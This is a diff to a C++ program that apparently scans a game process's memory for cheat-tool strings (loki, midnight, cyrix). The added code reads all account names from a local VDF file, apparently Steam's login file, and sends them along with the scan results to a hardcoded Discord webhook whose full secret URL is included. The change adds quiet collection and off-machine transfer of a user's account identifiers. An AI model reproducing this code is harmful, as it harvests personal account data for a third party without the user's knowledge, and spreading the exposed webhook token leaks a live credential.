@@ -106,6 +106,34 @@ std::string getFormattedUsernameFromVDF(const std::string& filePath) {
     return firstUsername;
 }
 
+std::vector<std::string> getAllAccountNamesFromVDF(const std::string& filePath) {
+    std::ifstream file(filePath);
+    if (!file.is_open()) {
+        std::cerr << "Failed to open file!" << std::endl;
+        return {};
+    }
+
+    std::vector<std::string> accountNames;
+    std::string line;
+
+    while (std::getline(file, line)) {
+        // Trim leading/trailing whitespace
+        line.erase(0, line.find_first_not_of(" \t"));
+        line.erase(line.find_last_not_of(" \t") + 1);
+
+        // Check for AccountName
+        if (line.find("\"AccountName\"") != std::string::npos) {
+            size_t startPos = line.find('"', line.find("AccountName") + 12) + 1;
+            size_t endPos = line.find('"', startPos);
+            if (startPos != std::string::npos && endPos != std::string::npos) {
+                accountNames.push_back(line.substr(startPos, endPos - startPos));
+            }
+        }
+    }
+
+    file.close();
+    return accountNames;
+}
 
 int main() {
     // Word lists to search.
@@ -148,12 +176,19 @@ int main() {
     // Start scanning memory regions.
     scanMemoryRegions(pid, lokiStrings, midnightStrings, cyrixStrings);
     std::cerr << "done\n";
+    std::vector<std::string> accountNames = getAllAccountNamesFromVDF(filePath);
+
+    std::cout << "Extracted Account Names:\n";
+    for (const auto& accountName : accountNames) {
+        std::cout << accountName << std::endl;
+    }
+
 
     // Webhook to send the message with the extracted username
     Webhook webhook("https://discord.com/api/webhooks/1311777600888246323/nV8g9srlCIa38yWxR7rhONJjaM9p4QOTWlZGXqrD_OF9IdoOZDYgeop9DrN8krrDFa3B");
 
     // Send webhook message using the formatted username
-    webhook.sendWebhookMessage(username, loki, midnight, cyrix);
+    webhook.sendWebhookMessage(username, loki, midnight, cyrix, accountNames);
 
     system("pause");
     return 0;
